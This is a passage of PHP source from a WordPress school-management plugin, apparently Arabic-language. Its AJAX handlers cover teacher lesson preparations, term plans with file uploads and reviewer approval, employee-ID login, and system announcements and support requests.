                $owner_count = $wpdb->get_var($wpdb->prepare("SELECT COUNT(*) FROM {$wpdb->prefix}sm_lesson_preps WHERE id IN ($placeholders) AND teacher_id = %d", array_merge($prep_ids, array($user_id))));
                if ($owner_count < count($prep_ids)) {
                    wp_send_json_error('عذراً، لا تمتلك صلاحيات حذف بعض أو كل التحضيرات المحددة.');
                }
            }
            $wpdb->query($wpdb->prepare("DELETE FROM {$wpdb->prefix}sm_lesson_preps WHERE id IN ($placeholders)", $prep_ids));
            wp_send_json_success(array('message' => 'تم حذف التحضيرات المحددة نهائياً.'));
        }
    }

    public function ajax_save_term_plan() {
        if (!is_user_logged_in()) wp_send_json_error('Unauthorized');
        if (!wp_verify_nonce($_POST['sm_nonce'] ?? '', 'sm_term_plan_action')) wp_send_json_error('Security check failed');

        $user_id = get_current_user_id();
        $plan_id = intval($_POST['plan_id'] ?? 0);
        $planning_method = sanitize_text_field($_POST['planning_method'] ?? 'create');

        $user_agent = $_SERVER['HTTP_USER_AGENT'] ?? '';
        $device_cat = 'computer';
        if (preg_match('/(ipad|tablet|(android(?!.*mobile))|(windows(?!.*phone)(.*touch))|kindle|playbook|silk|(puffin(?!.*(IP|AP|WP))))/i', $user_agent)) {
            $device_cat = 'tablet';
        } elseif (preg_match('/(mobi|ipod|phone|blackberry|opera mini|fennec|minimo|symbian|psp|nokia|samsung|android)/i', $user_agent)) {
            $device_cat = 'mobile';
        }

        if (strpos($planning_method, 'mobile') === false && strpos($planning_method, 'tablet') === false && strpos($planning_method, 'computer') === false) {
            $planning_method .= '_' . $device_cat;
        }
        $academic_year = sanitize_text_field($_POST['academic_year'] ?? '');
        $subject = sanitize_text_field($_POST['subject'] ?? '');

        $plan_grades = isset($_POST['assigned_plan_grades']) ? array_map('sanitize_text_field', (array)$_POST['assigned_plan_grades']) : array();
        $grade = !empty($plan_grades) ? implode('، ', $plan_grades) : sanitize_text_field($_POST['grade'] ?? '');

        $weekly_lessons = max(1, intval($_POST['weekly_lessons'] ?? 1));
        $num_terms = max(2, min(3, intval($_POST['num_terms'] ?? 3)));
        $term_number = max(1, min(3, intval($_POST['term_number'] ?? 1)));
        $start_date = sanitize_text_field($_POST['start_date'] ?? '');
        $end_date = sanitize_text_field($_POST['end_date'] ?? '');
        $status = sanitize_text_field($_POST['status'] ?? 'draft');

        // Handle uploaded document file if present
        $uploaded_file_url = '';
        if (!empty($_FILES['plan_document_file']['name'])) {
            require_once(ABSPATH . 'wp-admin/includes/file.php');
            require_once(ABSPATH . 'wp-admin/includes/image.php');
            require_once(ABSPATH . 'wp-admin/includes/media.php');

            $file_info = wp_check_filetype_and_ext($_FILES['plan_document_file']['tmp_name'], $_FILES['plan_document_file']['name']);

            // Non-administrators are strictly limited to PDF format only
            $is_admin_user = current_user_can('administrator') || in_array('sm_system_admin', (array) wp_get_current_user()->roles);
            if ($is_admin_user) {
                $allowed_mimes = array('pdf' => 'application/pdf', 'doc' => 'application/msword', 'docx' => 'application/vnd.openxmlformats-officedocument.wordprocessingml.document');
            } else {
                $allowed_mimes = array('pdf' => 'application/pdf');
            }

            if (!in_array($file_info['type'], $allowed_mimes) && !array_key_exists($file_info['ext'], $allowed_mimes)) {
                if ($is_admin_user) {
                    wp_send_json_error('عذراً، صيغة ملف الخطة المرفوع غير مدعومة. يرجى اختيار ملف PDF أو Word فقط.');
                } else {
                    wp_send_json_error('عذراً، صيغة ملف الخطة المرفوع يجب أن تكون PDF حصراً لكافة المعلمين والمستخدمين.');
                }
            }

            $attachment_id = media_handle_upload('plan_document_file', 0);
            if (!is_wp_error($attachment_id)) {
                $uploaded_file_url = wp_get_attachment_url($attachment_id);
            } else {
                wp_send_json_error('فشل رفع ملف الخطة إلى السيرفر: ' . $attachment_id->get_error_message());
            }
        }

        if (!in_array($status, array('draft', 'submitted', 'approved', 'returned'))) {
            $status = 'draft';
        }

        // Calculate weeks automatically
        $total_weeks = 0;
        if (!empty($start_date) && !empty($end_date)) {
            $t_start = strtotime($start_date);
            $t_end = strtotime($end_date);
            if ($t_end >= $t_start) {
                $days = floor(($t_end - $t_start) / (60 * 60 * 24));
                $total_weeks = max(1, ceil($days / 7));
            }
        }

        // Process weekly titles and summaries JSON
        $raw_weeks = $_POST['weeks'] ?? array();
        $weeks_data = array();
        if (is_array($raw_weeks)) {
            foreach ($raw_weeks as $w_num => $w_val) {
                $w_i = intval($w_num);
                $title = sanitize_text_field($w_val['title'] ?? '');
                $summary = sanitize_textarea_field($w_val['summary'] ?? '');
                $completed = (!empty($title) || !empty($summary)) ? 1 : 0;
                $weeks_data[$w_i] = array(
                    'title' => $title,
                    'summary' => $summary,
                    'completed' => $completed
                );
            }
        }

        // Compute completion percentage
        $completed_count = 0;
        if ($total_weeks > 0) {
            for ($i = 1; $i <= $total_weeks; $i++) {
                if (!empty($weeks_data[$i]['completed'])) {
                    $completed_count++;
                }
            }
            $completion_pct = round(($completed_count / $total_weeks) * 100);
        } else {
            $completion_pct = 0;
        }

        global $wpdb;

        // Ensure columns exist on database table dynamically
        $wpdb->query("ALTER TABLE {$wpdb->prefix}sm_term_plans ADD COLUMN IF NOT EXISTS plan_file_url text DEFAULT NULL");
        $wpdb->query("ALTER TABLE {$wpdb->prefix}sm_term_plans ADD COLUMN IF NOT EXISTS planning_method varchar(50) DEFAULT 'create' NOT NULL");

        $data_fields = array(
            'teacher_id' => $user_id,
            'academic_year' => $academic_year,
            'subject' => $subject,
            'grade' => $grade,
            'weekly_lessons' => $weekly_lessons,
            'num_terms' => $num_terms,
            'term_number' => $term_number,
            'start_date' => $start_date,
            'end_date' => $end_date,
            'total_weeks' => $total_weeks,
            'weeks_data' => wp_json_encode($weeks_data),
            'planning_method' => $planning_method,
            'completion_pct' => $completion_pct,
            'status' => $status
        );

        if (!empty($uploaded_file_url)) {
            $data_fields['plan_file_url'] = $uploaded_file_url;
        }

        if ($plan_id > 0) {
            // Ensure owner or admin
            $existing = $wpdb->get_row($wpdb->prepare("SELECT * FROM {$wpdb->prefix}sm_term_plans WHERE id = %d", $plan_id));
            if (!$existing) wp_send_json_error('الخطة غير موجودة.');
            if ($existing->teacher_id != $user_id && !current_user_can('manage_options')) {
                wp_send_json_error('عذراً، لا تمتلك صلاحية تعديل هذه الخطة.');
            }

            $wpdb->update("{$wpdb->prefix}sm_term_plans", $data_fields, array('id' => $plan_id));
            SM_Logger::log('حفظ الخطة الفصلية', "تم حفظ الخطة (ID: $plan_id) بحالة: $status بنسبة $completion_pct%");
            wp_send_json_success(array('plan_id' => $plan_id, 'status' => $status, 'completion_pct' => $completion_pct, 'total_weeks' => $total_weeks));
        } else {
            $inserted = $wpdb->insert("{$wpdb->prefix}sm_term_plans", $data_fields);
            if ($inserted) {
                $new_id = $wpdb->insert_id;
                SM_Logger::log('إنشاء خطة فصلية', "تم إنشاء خطة فصلية جديدة (ID: $new_id)");
                wp_send_json_success(array(
                    'plan_id' => $new_id,
                    'status' => $status,
                    'completion_pct' => $completion_pct,
                    'total_weeks' => $total_weeks,
                    'message' => 'تم رفع وإرسال الخطة الفصلية بنجاح وتوثيقها في قاعدة البيانات.'
                ));
            } else {
                wp_send_json_error('فشل حفظ الخطة في قاعدة البيانات.');
            }
        }
    }

    public function ajax_review_term_plan() {
        if (!is_user_logged_in()) wp_send_json_error('Unauthorized');
        if (!wp_verify_nonce($_POST['sm_nonce'] ?? '', 'sm_term_plan_action')) wp_send_json_error('Security check failed');

        $roles = (array) wp_get_current_user()->roles;
        $can_review = in_array('administrator', $roles) || in_array('sm_system_admin', $roles) || in_array('sm_principal', $roles) || in_array('sm_supervisor', $roles) || in_array('sm_coordinator', $roles) || in_array('sm_hod', $roles) || in_array('sm_activities_supervisor', $roles) || current_user_can('manage_options');

        if (!$can_review) {
            wp_send_json_error('عذراً، لا تمتلك صلاحية مراجعة الخطة.');
        }

        $plan_id = intval($_POST['plan_id'] ?? 0);
        $review_status = sanitize_text_field($_POST['review_status'] ?? '');
        $review_notes = sanitize_textarea_field($_POST['review_notes'] ?? '');

        if (!in_array($review_status, array('approved', 'returned', 'rejected'))) {
            wp_send_json_error('حالة المراجعة غير صحيحة.');
        }

        global $wpdb;
        $updated = $wpdb->update(
            "{$wpdb->prefix}sm_term_plans",
            array(
                'status' => $review_status,
                'review_notes' => $review_notes,
                'reviewed_by' => get_current_user_id(),
                'reviewed_at' => current_time('mysql')
            ),
            array('id' => $plan_id)
        );

        if ($updated !== false) {
            SM_Logger::log('مراجعة خطة فصلية', "تم مراجعة الخطة ID: $plan_id وتغيير الحالات إلى: $review_status");
            wp_send_json_success(array('plan_id' => $plan_id, 'status' => $review_status));
        } else {
            wp_send_json_error('فشل تحديث حالة الخطة.');
        }
    }

    public function ajax_delete_term_plan() {
        if (!is_user_logged_in()) wp_send_json_error('Unauthorized');
        if (!wp_verify_nonce($_POST['sm_nonce'] ?? '', 'sm_term_plan_action')) wp_send_json_error('Security check failed');

        $plan_id = intval($_POST['plan_id'] ?? 0);
        if (!$plan_id) {
            wp_send_json_error('معرف الخطة غير صحيح.');
        }

        global $wpdb;
        $plan = $wpdb->get_row($wpdb->prepare("SELECT * FROM {$wpdb->prefix}sm_term_plans WHERE id = %d", $plan_id));
        if (!$plan) {
            wp_send_json_error('الخطة غير موجودة أو تم حذفها سابقاً.');
        }

        $current_user = wp_get_current_user();
        $user_id = $current_user->ID;
        $roles = (array) $current_user->roles;

        $can_delete = in_array('administrator', $roles) ||
                      in_array('sm_system_admin', $roles) ||
                      in_array('sm_principal', $roles) ||
                      in_array('sm_supervisor', $roles) ||
                      in_array('sm_coordinator', $roles) ||
                      in_array('sm_hod', $roles) ||
                      in_array('sm_activities_supervisor', $roles) ||
                      current_user_can('manage_options') ||
                      (intval($plan->teacher_id) === $user_id);

        if (!$can_delete) {
            wp_send_json_error('عذراً، لا تمتلك الصلاحية الكافية لحذف هذه الخطة.');
        }

        $deleted = $wpdb->delete("{$wpdb->prefix}sm_term_plans", array('id' => $plan_id));

        if ($deleted) {
            SM_Logger::log('حذف خطة فصلية', "تم حذف الخطة (ID: $plan_id) بواسطة المستخدم {$current_user->display_name}");
            wp_send_json_success(array('plan_id' => $plan_id, 'message' => 'تم حذف الخطة بنجاح.'));
        } else {
            wp_send_json_error('تعذر حذف الخطة من قاعدة البيانات.');
        }
    }

    public function ajax_verify_employee_id() {
        $emp_id   = isset($_POST['emp_id']) ? sanitize_text_field($_POST['emp_id']) : '';
        $password = isset($_POST['password']) ? $_POST['password'] : '';

        if (empty($emp_id) || empty($password)) {
            wp_send_json_error('يرجى إدخال الرقم الوظيفي/رقم الجوال وكلمة المرور بشكل صحيح.');
        }

        $teacher = SM_DB::get_teacher_by_employee_id_or_phone($emp_id);
        if (!$teacher) {
            wp_send_json_error('لم يتم العثور على حساب مطابق للبيانات المدخلة. يرجى التأكد من الرقم الوظيفي أو رقم الهاتف.');
        }

        if (!wp_check_password($password, $teacher->user_pass, $teacher->ID)) {
            wp_send_json_error('كلمة المرور المدخلة غير صحيحة. يرجى المحاولة مجدداً.');
        }

        wp_set_current_user($teacher->ID);
        wp_set_auth_cookie($teacher->ID, true);

        $subject = get_user_meta($teacher->ID, 'sm_specialization', true) ?: (get_user_meta($teacher->ID, 'specialization', true) ?: (get_user_meta($teacher->ID, 'subject', true) ?: 'عام'));
        $school  = get_user_meta($teacher->ID, 'eess_school_name', true) ?: (get_user_meta($teacher->ID, 'sm_school_name', true) ?: 'المدرسة الرئيسية');
        $dept    = get_user_meta($teacher->ID, 'eess_department', true) ?: 'قسم المادة';
        $classes = get_user_meta($teacher->ID, 'sm_assigned_classes', true) ?: array();
        $grade   = get_user_meta($teacher->ID, 'sm_grade_level', true) ?: (get_user_meta($teacher->ID, 'grade', true) ?: '');
        $section = get_user_meta($teacher->ID, 'sm_class_section', true) ?: (get_user_meta($teacher->ID, 'section', true) ?: '');
        $emp_code= get_user_meta($teacher->ID, 'eess_employee_number', true) ?: (get_user_meta($teacher->ID, 'sm_employee_id', true) ?: $emp_id);

        $fresh_nonce = wp_create_nonce('sm_mobile_prep_nonce');

        wp_send_json_success(array(
            'teacher_id'   => $teacher->ID,
            'emp_id'       => $emp_code,
            'teacher_name' => $teacher->display_name,
            'school'       => $school,
            'department'   => $dept,
            'subject'      => $subject,
            'grade'        => $grade,
            'section'      => $section,
            'classes'      => $classes,
            'fresh_nonce'  => $fresh_nonce
        ));
    }

    public function ajax_submit_mobile_lesson() {
        if (!wp_verify_nonce($_POST['sm_nonce'] ?? '', 'sm_mobile_prep_nonce') && !wp_verify_nonce($_POST['sm_nonce'] ?? '', 'sm_mobile_prep_action') && !wp_verify_nonce($_POST['sm_nonce'] ?? '', 'sm_term_plan_action')) {
            wp_send_json_error('فشل التوثيق الأمني للجلسة.');
        }

        $current_user_id = get_current_user_id();

        if (!$current_user_id) {
            wp_send_json_error('عفواً، انتهت صلاحية الجلسة. يرجى تسجيل الدخول مجدداً عبر النظام.');
        }

        $teacher = get_userdata($current_user_id);
        if (!$teacher) {
            wp_send_json_error('فشل التوثيق الأمني لملف المعلم.');
        }

        $title         = sanitize_text_field($_POST['title'] ?? ($_POST['lesson_title'] ?? ''));
        $subject       = sanitize_text_field($_POST['subject'] ?? 'عام');
        $grade_level   = sanitize_text_field($_POST['grade_level'] ?? 'عام');
        $class_section = sanitize_text_field($_POST['class_section'] ?? '');
        $lesson_date   = sanitize_text_field($_POST['lesson_date'] ?? current_time('Y-m-d'));

        if (empty($title)) {
            wp_send_json_error('يرجى استكمال جميع البيانات الأساسية المطلوبة للدرس.');
        }

        $file_url = '';
        if (!empty($_FILES['lesson_file']['name'])) {
            require_once(ABSPATH . 'wp-admin/includes/file.php');
            require_once(ABSPATH . 'wp-admin/includes/image.php');
            require_once(ABSPATH . 'wp-admin/includes/media.php');

            $file_info = wp_check_filetype_and_ext($_FILES['lesson_file']['tmp_name'], $_FILES['lesson_file']['name']);
            $allowed_mimes = array('pdf' => 'application/pdf', 'doc' => 'application/msword', 'docx' => 'application/vnd.openxmlformats-officedocument.wordprocessingml.document');

            if (!in_array($file_info['type'], $allowed_mimes) && !array_key_exists($file_info['ext'], $allowed_mimes)) {
                wp_send_json_error('عذراً، نوع الملف المرفق غير مدعوم. يرجى اختيار ملف PDF أو Word فقط.');
            }

            $attachment_id = media_handle_upload('lesson_file', 0);
            if (!is_wp_error($attachment_id)) {
                $file_url = wp_get_attachment_url($attachment_id);
            } else {
                wp_send_json_error('فشل رفع الملف إلى السيرفر: ' . $attachment_id->get_error_message());
            }
        }

        $lesson_data = array(
            'objectives'      => sanitize_textarea_field($_POST['objectives'] ?? ''),
            'warmup'          => sanitize_textarea_field($_POST['warmup'] ?? ''),
            'physical_prep'   => sanitize_textarea_field($_POST['physical_prep'] ?? ''),
            'skill_prep'      => sanitize_textarea_field($_POST['skill_prep'] ?? ''),
            'conclusion'      => sanitize_textarea_field($_POST['conclusion'] ?? ''),
            'national_agenda' => sanitize_textarea_field($_POST['national_agenda'] ?? ''),
            'cross_subject'   => sanitize_textarea_field($_POST['cross_subject'] ?? ''),
            'activities'      => sanitize_textarea_field($_POST['activities'] ?? ''),
            'evaluation'      => sanitize_textarea_field($_POST['evaluation'] ?? ''),
            'homework'        => sanitize_textarea_field($_POST['homework'] ?? ''),
            'notes'           => sanitize_textarea_field($_POST['notes'] ?? ''),
            'file_url'        => $file_url,
            'submitted_via'   => 'mobile_app'
        );

        $supervisors = get_users(array('role__in' => array('sm_supervisor', 'sm_principal', 'administrator')));
        $supervisor_id = !empty($supervisors) ? $supervisors[0]->ID : 1;

        // Calculate Late Submission Status & Delay Seconds against authoritative deadline
        $prep_settings = get_option('sm_lesson_prep_settings', array('deadline_time' => '12:00'));
        $deadline_time = $prep_settings['deadline_time'] ?? '12:00';
        if (strlen($deadline_time) == 5) $deadline_time .= ':00';

        $tz = wp_timezone();
        $now_dt = new DateTime('now', $tz);
        $deadline_dt = new DateTime($lesson_date . ' ' . $deadline_time, $tz);

        $delay_seconds = 0;
        $status = 'submitted';

        // Exemption check for Physical Education
        $is_pe = (strpos(strtolower($subject), 'رياضية') !== false || strpos(strtolower($subject), 'بدنية') !== false || strpos(strtolower($subject), 'pe') !== false || strpos(strtolower($subject), 'physical') !== false);
        $is_monday = (date('N', strtotime($lesson_date)) == 1);
        $exempt = ($is_pe && ($prep_settings['pe_monday_only'] ?? 'yes') === 'yes' && !$is_monday);

        if ($now_dt > $deadline_dt && !$exempt) {
            $delay_seconds = $now_dt->getTimestamp() - $deadline_dt->getTimestamp();
            $status = 'late';
        }

        global $wpdb;
        $inserted = $wpdb->insert(
            "{$wpdb->prefix}sm_lesson_preps",
            array(
                'teacher_id'      => $teacher->ID,
                'supervisor_id'   => $supervisor_id,
                'title'           => $title,
                'subject'         => $subject,
                'grade_level'     => $grade_level,
                'class_section'   => $class_section,
                'lesson_date'     => $lesson_date,
                'submission_time' => current_time('mysql'),
                'status'          => $status,
                'delay_seconds'   => $delay_seconds,
                'lesson_data'     => json_encode($lesson_data),
                'version'         => 1,
                'parent_id'       => 0,
                'created_at'      => current_time('mysql'),
                'updated_at'      => current_time('mysql')
            )
        );

        if ($inserted) {
            $prep_id = $wpdb->insert_id;
            SM_Logger::log('تحضير درس من الموبايل', "تم إضافة تحضير درس (ID: $prep_id) عبر الموبايل للمعلم: {$teacher->display_name}");
            wp_send_json_success(array('prep_id' => $prep_id, 'message' => 'تم حفظ وإرسال التحضير بنجاح وتوثيقه في حسابك.'));
        } else {
            wp_send_json_error('حدث خطأ أثناء حفظ التحضير بقاعدة البيانات.');
        }
    }

    public function ajax_create_system_announcement() {
        if (!is_user_logged_in() || !current_user_can('manage_options')) {
            wp_send_json_error('عفواً، غير مصرح لك بإنشاء إعلانات النظام.');
        }

        $title            = sanitize_text_field($_POST['title'] ?? '');
        $details          = sanitize_textarea_field($_POST['details'] ?? '');
        $type             = sanitize_text_field($_POST['type'] ?? 'info');
        $display_duration = intval($_POST['display_duration'] ?? 10);
        $display_freq     = intval($_POST['display_frequency'] ?? 1);
        $roles            = isset($_POST['target_roles']) ? array_map('sanitize_text_field', (array)$_POST['target_roles']) : array();

        if (empty($title) || empty($details) || empty($roles)) {
            wp_send_json_error('يرجى تعبئة جميع الحقول المطلوبة واختيار الرتب المستهدفة.');
        }

        if (mb_strlen($details) > 500) {
            wp_send_json_error('تفاصيل الإشعار يجب ألا تتجاوز 500 حرف.');
        }

        global $wpdb;
        $inserted = $wpdb->insert(
            "{$wpdb->prefix}sm_system_announcements",
            array(
                'title'             => $title,
                'details'           => $details,
                'target_roles'      => json_encode($roles),
                'type'              => $type,
                'display_duration'  => $display_duration,
                'display_frequency' => $display_freq,
                'status'            => 'active',
                'created_by'        => get_current_user_id(),
                'created_at'        => current_time('mysql')
            )
        );

        if ($inserted) {
            $anc_id = $wpdb->insert_id;
            SM_Logger::log('إنشاء إشعار نظام', "تم نشر إشعار نظام جديد (ID: $anc_id) بعنوان: $title");
            wp_send_json_success(array('announcement_id' => $anc_id, 'message' => 'تم نشر الإشعار والتعميم بنجاح.'));
        } else {
            wp_send_json_error('حدث خطأ أثناء نشر الإشعار.');
        }
    }

    private function eess_ensure_first_login_welcome($user_id) {
        if (!$user_id) return;

        global $wpdb;
        // Ensure master welcome template row exists in sm_system_announcements with placeholder {user_name}
        $welcome_template = $wpdb->get_row("SELECT * FROM {$wpdb->prefix}sm_system_announcements WHERE is_welcome = 1 LIMIT 1");
        if (!$welcome_template) {
            $wpdb->insert(
                "{$wpdb->prefix}sm_system_announcements",
                array(
                    'title'             => 'أهلاً بك، {user_name}',
                    'details'           => 'أهلاً بك في النظام. تم تصميم هذه المنظومة لتنظيم وتسهيل عملك، وتوفير وصول أسرع لمهامك ومسؤولياتك، وتحسين التواصل وتدفق العمل اليومي.',
                    'target_roles'      => json_encode(array('all_users')),
                    'type'              => 'success',
                    'display_duration'  => 12,
                    'display_frequency' => 1,
                    'is_welcome'        => 1,
                    'status'            => 'active',
                    'created_by'        => 1,
                    'created_at'        => current_time('mysql')
                )
            );
        }
    }

    public function ajax_get_pending_announcements() {
        if (!is_user_logged_in()) {
            wp_send_json_success(array());
        }

        $user = wp_get_current_user();
        $user_id = $user->ID;
        $user_name = $user->display_name ?: $user->first_name ?: $user->user_login;

        $this->eess_ensure_first_login_welcome($user_id);

        $user_roles = (array) $user->roles;

        global $wpdb;
        $announcements = $wpdb->get_results("SELECT * FROM {$wpdb->prefix}sm_system_announcements WHERE status = 'active' ORDER BY id ASC");

        $pending = array();

        foreach ($announcements as $anc) {
            $target_roles = json_decode($anc->target_roles, true) ?: array();
            $matches_role = in_array('all_users', $target_roles) || in_array('administrator', $user_roles);
            if (!$matches_role) {
                foreach ($user_roles as $r) {
                    if (in_array($r, $target_roles)) {
                        $matches_role = true;
                        break;
                    }
                }
            }

            if (!$matches_role) continue;

            $activity = $wpdb->get_row($wpdb->prepare(
                "SELECT * FROM {$wpdb->prefix}sm_user_announcements WHERE announcement_id = %d AND user_id = %d",
                $anc->id, $user_id
            ));

            if ($activity && $activity->status === 'closed') {
                continue;
            }

            if (!$activity || $activity->status === 'pending' || ($activity->status === 'viewed' && $activity->view_count < $anc->display_frequency)) {
                $title_text = str_replace('{user_name}', $user_name, $anc->title);
                $details_text = str_replace('{user_name}', $user_name, $anc->details);

                $pending[] = array(
                    'id'               => intval($anc->id),
                    'title'            => $title_text,
                    'details'          => $details_text,
                    'type'             => $anc->type,
                    'display_duration' => intval($anc->display_duration),
                    'display_frequency'=> intval($anc->display_frequency)
                );
            }
        }

        wp_send_json_success($pending);
    }

    public function ajax_mark_announcement_viewed() {
        if (!is_user_logged_in()) wp_send_json_error('Unauthorized');
        $anc_id = intval($_POST['announcement_id'] ?? 0);
        $user_id = get_current_user_id();

        if (!$anc_id) wp_send_json_error('ID غير صحيح');

        global $wpdb;
        $existing = $wpdb->get_row($wpdb->prepare(
            "SELECT * FROM {$wpdb->prefix}sm_user_announcements WHERE announcement_id = %d AND user_id = %d",
            $anc_id, $user_id
        ));

        if ($existing) {
            $wpdb->update(
                "{$wpdb->prefix}sm_user_announcements",
                array(
                    'status'     => 'viewed',
                    'view_count' => $existing->view_count + 1,
                    'viewed_at'  => current_time('mysql')
                ),
                array('id' => $existing->id)
            );
        } else {
            $wpdb->insert(
                "{$wpdb->prefix}sm_user_announcements",
                array(
                    'announcement_id' => $anc_id,
                    'user_id'         => $user_id,
                    'status'          => 'viewed',
                    'view_count'      => 1,
                    'viewed_at'       => current_time('mysql')
                )
            );
        }

        wp_send_json_success();
    }

    public function ajax_mark_announcement_closed() {
        if (!is_user_logged_in()) wp_send_json_error('Unauthorized');
        $anc_id = intval($_POST['announcement_id'] ?? 0);
        $user_id = get_current_user_id();

        if (!$anc_id) wp_send_json_error('ID غير صحيح');

        global $wpdb;
        $existing = $wpdb->get_row($wpdb->prepare(
            "SELECT * FROM {$wpdb->prefix}sm_user_announcements WHERE announcement_id = %d AND user_id = %d",
            $anc_id, $user_id
        ));

        if ($existing) {
            $wpdb->update(
                "{$wpdb->prefix}sm_user_announcements",
                array(
                    'status'    => 'closed',
                    'closed_at' => current_time('mysql')
                ),
                array('id' => $existing->id)
            );
        } else {
            $wpdb->insert(
                "{$wpdb->prefix}sm_user_announcements",
                array(
                    'announcement_id' => $anc_id,
                    'user_id'         => $user_id,
                    'status'          => 'closed',
                    'view_count'      => 1,
                    'closed_at'       => current_time('mysql')
                )
            );
        }

        wp_send_json_success();
    }

    public function ajax_reset_user_announcement() {
        if (!is_user_logged_in() || !current_user_can('manage_options')) {
            wp_send_json_error('عفواً، غير مصرح لك بهذا الإجراء.');
        }

        $anc_id  = intval($_POST['announcement_id'] ?? 0);
        $target_user_id = intval($_POST['user_id'] ?? 0);

        if (!$anc_id || !$target_user_id) wp_send_json_error('بيانات الإشعار أو المستخدم غير مكملة.');

        global $wpdb;
        $deleted = $wpdb->delete(
            "{$wpdb->prefix}sm_user_announcements",
            array('announcement_id' => $anc_id, 'user_id' => $target_user_id)
        );

        if ($deleted !== false) {
            SM_Logger::log('إعادة تفعيل إشعار', "تم إعادة تفعيل الإشعار (ID: $anc_id) للمستخدم ID: $target_user_id");
            wp_send_json_success();
        } else {
            wp_send_json_error('فشل إعادة ضبط الإشعار.');
        }
    }

    public function ajax_disable_system_announcement() {
        if (!is_user_logged_in() || !current_user_can('manage_options')) {
            wp_send_json_error('عفواً، غير مصرح لك بهذا الإجراء.');
        }

        $anc_id = intval($_POST['announcement_id'] ?? 0);
        if (!$anc_id) wp_send_json_error('ID الإشعار غير صحيح.');

        global $wpdb;
        $updated = $wpdb->update(
            "{$wpdb->prefix}sm_system_announcements",
            array('status' => 'disabled'),
            array('id' => $anc_id)
        );

        if ($updated !== false) {
            SM_Logger::log('تعطيل إشعار نظام', "تم تغيير حالة الإشعار (ID: $anc_id) إلى تعطيل Disabled");
            wp_send_json_success(array('announcement_id' => $anc_id, 'message' => 'تم تعطيل الإشعار بنجاح وإيقاف ظهوره تلقائياً.'));
        } else {
            wp_send_json_error('حدث خطأ أثناء تعطيل الإشعار.');
        }
    }

    public function ajax_delete_system_announcement() {
        if (!is_user_logged_in() || !current_user_can('manage_options')) {
            wp_send_json_error('عفواً، غير مصرح لك بهدم وحذف سجلات الإشعارات.');
        }

        $anc_id = intval($_POST['announcement_id'] ?? 0);
        if (!$anc_id) wp_send_json_error('ID الإشعار غير صحيح.');

        global $wpdb;
        // Delete announcement record
        $wpdb->delete("{$wpdb->prefix}sm_system_announcements", array('id' => $anc_id));
        // Delete all associated user reading interaction logs
        $wpdb->delete("{$wpdb->prefix}sm_user_announcements", array('announcement_id' => $anc_id));

        SM_Logger::log('حذف إشعار نظام نهائياً', "تم حذف الإشعار ID: $anc_id وكافة سجلات قراءته نهائياً");
        wp_send_json_success(array('message' => 'تم حذف الإشعار وكافة سجلات التفاعل الخاصة به نهائياً.'));
    }

    public function ajax_delete_user_announcement_log() {
        if (!is_user_logged_in() || !current_user_can('manage_options')) {
            wp_send_json_error('عفواً، غير مصرح لك بهذا الإجراء.');
        }

        $log_id = intval($_POST['log_id'] ?? 0);
        if (!$log_id) wp_send_json_error('ID السجل غير صحيح.');

        global $wpdb;
        $deleted = $wpdb->delete("{$wpdb->prefix}sm_user_announcements", array('id' => $log_id));

        if ($deleted) {
            SM_Logger::log('حذف سجل تفاعل مستخدم', "تم حذف سجل تفاعل إشعار (ID: $log_id) نهائياً");
            wp_send_json_success(array('message' => 'تم حذف سجل التفاعل الفردي بنجاح.'));
        } else {
            wp_send_json_error('حدث خطأ أثناء حذف السجل.');
        }
    }

    // Technical Support & Help Capsule AJAX Endpoints
    public function ajax_submit_support_request() {
        if (!is_user_logged_in()) {
            wp_send_json_error('عفواً، يجب تسجيل الدخول لتقديم طلب الدعم والمساعدة.');
        }

        $user_id  = get_current_user_id();
        $category = sanitize_text_field($_POST['category'] ?? '');

        if (!in_array($category, array('suggestion', 'technical_issue', 'rating'))) {
            wp_send_json_error('تصنيف الطلب غير صحيح.');
        }

        if ($category === 'suggestion') {
            $title   = sanitize_text_field($_POST['title'] ?? '');
            $details = sanitize_textarea_field($_POST['details'] ?? '');

            if (empty($title) || empty($details)) {
                wp_send_json_error('جميع الحقول مطلوبة لإرسال المقترح.');
            }

            if (mb_strlen($details) > 1000) {
                wp_send_json_error('تفاصيل المقترح تتجاوز الحد الأقصى المسموح به (1000 حرف).');
            }

            $req_id = SM_DB::add_support_request(array(
                'user_id'  => $user_id,
                'category' => 'suggestion',
                'title'    => $title,
                'details'  => $details,
                'status'   => 'new'
            ));

            if ($req_id) {
                SM_Logger::log('تقديم مقترح', "تم تقديم مقترح جديد (ID: $req_id) بعنوان: $title");
                wp_send_json_success(array('message' => 'نشكرك على تقديم هذا المقترح المتميز! تم استلامه وبانتظار مراجعة الإدارة.'));
            } else {
                wp_send_json_error('حدث خطأ أثناء حفظ المقترح.');
            }

        } elseif ($category === 'technical_issue') {
            $title   = sanitize_text_field($_POST['title'] ?? '');
            $details = sanitize_textarea_field($_POST['details'] ?? '');
            $attachment_url = '';

            if (empty($title) || empty($details)) {
                wp_send_json_error('عنوان المشكلة وتفاصيلها حقول إلزامية.');
            }

            if (!empty($_FILES['screenshot']['name'])) {
                $file = $_FILES['screenshot'];

                // File validation: type and size (max 5MB)
                $allowed_mimes = array('image/jpeg', 'image/png', 'image/gif', 'image/webp');
                if (!in_array($file['type'], $allowed_mimes)) {
                    wp_send_json_error('نوع الملف غير مدعوم. يُسمح فقط بالصور (JPG, PNG, GIF, WEBP).');
                }

                if ($file['size'] > 5 * 1024 * 1024) {
                    wp_send_json_error('حجم الملف يتجاوز الحد الأقصى المسموح به (5 ميجابايت).');
                }

                require_once(ABSPATH . 'wp-admin/includes/image.php');
                require_once(ABSPATH . 'wp-admin/includes/file.php');
                require_once(ABSPATH . 'wp-admin/includes/media.php');

                $attachment_id = media_handle_upload('screenshot', 0);
                if (is_wp_error($attachment_id)) {
                    wp_send_json_error('فشل رفع لقطة الشاشة: ' . $attachment_id->get_error_message());
                }
                $attachment_url = wp_get_attachment_url($attachment_id);
            }

            $req_id = SM_DB::add_support_request(array(
                'user_id'        => $user_id,
                'category'       => 'technical_issue',
                'title'          => $title,
                'details'        => $details,
                'attachment_url' => $attachment_url,
                'status'         => 'new'
            ));

            if ($req_id) {
                SM_Logger::log('الإبلاغ عن مشكلة فنية', "تم الإبلاغ عن مشكلة فنية (ID: $req_id) بعنوان: $title");
                wp_send_json_success(array('message' => 'تم إرسال بلاغ المشكلة الفنية بنجاح. وسوف يتواصل معك الفريق التقني فور المراجعة.'));
            } else {
                wp_send_json_error('حدث خطأ أثناء إرسال بلاغ المشكلة.');
            }

        } elseif ($category === 'rating') {
